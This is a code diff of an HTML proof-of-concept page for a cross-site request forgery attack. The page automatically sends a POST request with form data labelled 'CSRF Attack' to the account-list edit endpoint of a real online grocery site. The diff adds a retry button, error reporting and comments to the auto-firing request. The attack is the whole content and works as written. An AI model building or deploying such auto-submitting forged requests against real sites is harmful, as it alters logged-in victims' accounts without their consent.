@@ -9,9 +9,13 @@
 
   <p id="status">Sending request...</p>
 
+  <button id="retryBtn" style="display:none;">Retry Submit</button>
+
   <script>
     const status = document.getElementById('status');
+    const retryBtn = document.getElementById('retryBtn');
 
+    // Prepare the form data
     function createFormData() {
       const fd = new FormData();
       fd.append('title', 'CSRF Attack');
@@ -19,8 +23,10 @@
       return fd;
     }
 
+    // Function to send the POST request
     function sendRequest() {
       status.textContent = 'Sending request...';
+      retryBtn.style.display = 'none';
 
       fetch('https://www.mathem.se/se/account/lists/edit/', {
         method: 'POST',
@@ -34,12 +40,18 @@
       .then(text => {
         console.log('Response body:', text);
       })
-      .catch(() => {
-        // Silently fail on error, no message shown
+      .catch(error => {
+        status.textContent = 'Error: ' + error;
+        console.error('Fetch error:', error);
+        retryBtn.style.display = 'inline-block';
       });
     }
 
+    // Send request automatically when page loads
     window.onload = sendRequest;
+
+    // Retry button handler
+    retryBtn.addEventListener('click', sendRequest);
   </script>
 </body>
 </html>
